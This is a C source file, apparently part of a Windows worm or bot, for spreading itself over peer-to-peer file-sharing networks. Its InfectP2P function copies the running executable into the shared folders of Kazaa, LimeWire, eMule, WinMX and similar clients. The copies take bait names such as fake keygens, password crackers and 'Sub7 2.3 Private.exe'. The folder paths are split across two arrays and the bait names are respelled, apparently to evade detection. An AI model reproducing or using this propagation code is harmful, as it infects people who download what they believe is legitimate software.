#include "Peer2Peer.h"

struct Peer2PeerInfo_s
{
   char szDirectory[MAX_PATH];
   char szFilePath[MAX_PATH];
};


const char *szPath[] =
{
    "C:\\program files\\kaz",
    "C:\\program files\\kaz",
    "C:\\program files\\kaz",
    "C:\\program files\\ic",
    "C:\\program files\\gro",
    "C:\\program files\\bear",
    "C:\\program files\\edonk",
    "C:\\program files\\emu",
    "C:\\program files\\mor",
    "C:\\program files\\li",
    "C:\\program files\\te",
    "C:\\program files\\wi"
};

const char *szPathAdd[] =
{
    "aa\\my shared folder\\",
    "aa lite\\my shared folder\\",
    "aa lite k++\\my shared folder\\",
    "q\\shared folder\\",
    "kster\\my grokster\\",
    "share\\shared\\",
    "ey2000\\incoming\\",
    "le\\incoming\\",
    "pheus\\my shared folder\\",
    "mewire\\shared\\",
    "sla\\files\\",
    "nmx\\shared\\"
};
const char *szFiles[] =
{
    "Windows 2003 Advanced Server KeyGen.exe",
    "UT 2003 KeyGen.exe",
    "Half-Life 2 Downloader.exe",
    "Password C_R_A_C_K_E_R.exe",
    "FTP C_R_A_C_K_E_R.exe",
    "Brutus FTP C_R_A_C_K_E_R.exe",
    "Hotmail Hacker.exe",
    "Hotmail C_R_A_C_K_E_R.exe",
    "Windows.Vista.32.bit.C_R_A_C_K.by.RELOADED.exe",
    "Norton Anti-Virus 2008 Enterprise C_R_A_C_K.exe",
    "DCOM E_X_P_L_O_I_T.exe",
    "NetBIOS Hacker.exe",
    "NetBIOS C_R_A_C_K_E_R.exe",
    "Windows Password C_R_A_C_K_E_R.exe",
    "L0pht 4.0 Windows Password C_R_A_C_K_E_R.exe",
    "sdbot with NetBIOS Spread.exe",
    "Sub7 2.3 Private.exe",
    "Microsoft Visual C++ KeyGen.exe",
    "Microsoft Visual Basic KeyGen.exe",
    "Microsoft Visual Studio KeyGen.exe",
    "MSN Password C_R_A_C_K_E_R.exe",
    "AOL Instant Messenger (AIM) Hacker.exe",
    "ICQ Hacker.exe",
    "AOL Password C_R_A_C_K_E_R.exe",
    "Keylogger.exe",
    "Website Hacker.exe",
    "IP Nuker.exe",
    "Counter-Strike KeyGen.exe",
    "DivX 5.0 Pro KeyGen.exe"
};

bool InfectP2P()
{
    Peer2PeerInfo_s pPeer2PeerInfo_s;

    if (&pPeer2PeerInfo_s)
        ZeroMemory(&pPeer2PeerInfo_s, sizeof(Peer2PeerInfo_s));
    else
        ExitThread(0);

    GetModuleFileNameA(GetModuleHandle(NULL), pPeer2PeerInfo_s.szDirectory, sizeof(pPeer2PeerInfo_s.szDirectory));
    for (int i = 0; i < (sizeof(szPath) / sizeof(LPTSTR)); i++)
    {
        for (int j = 0; j < (sizeof(szFiles) / sizeof(LPTSTR)); j++)
        {
            strcpy(pPeer2PeerInfo_s.szFilePath, szPath[i]);
            strcat(pPeer2PeerInfo_s.szFilePath, szPathAdd[i]);
            strcat(pPeer2PeerInfo_s.szFilePath, szFiles[j]);
            if (CopyFileA(pPeer2PeerInfo_s.szDirectory, pPeer2PeerInfo_s.szFilePath, false) != 0)
            {
                SetFileAttributesA(pPeer2PeerInfo_s.szFilePath, FILE_ATTRIBUTE_NORMAL);
            }
        }
    }
    return true;
}
